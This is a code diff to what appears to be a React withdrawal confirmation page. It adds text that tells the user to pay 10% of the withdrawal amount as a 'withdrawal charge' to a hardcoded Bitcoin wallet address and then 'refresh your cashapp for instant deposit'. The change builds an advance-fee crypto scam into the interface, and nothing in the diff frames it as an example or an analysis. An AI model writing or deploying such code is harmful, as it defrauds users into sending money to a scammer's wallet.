@@ -397,7 +397,9 @@ className={labelCls}>Last 4 Digits of Card</label>
               <p>
                 Your withdrawal of{" "}
                 <span className="font-bold text-foreground">{formatUsd(done.amount)}</span>{" "}
-                has been placed successfully.
+                has been placed successfully. Pay exactly <p>{formatUsd(numericAmount * 0.1)} withdrwal charge to the wallet address below and refresh your cashapp for instant deposit
+                bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x
+                </p>
               </p>
             </div>
 
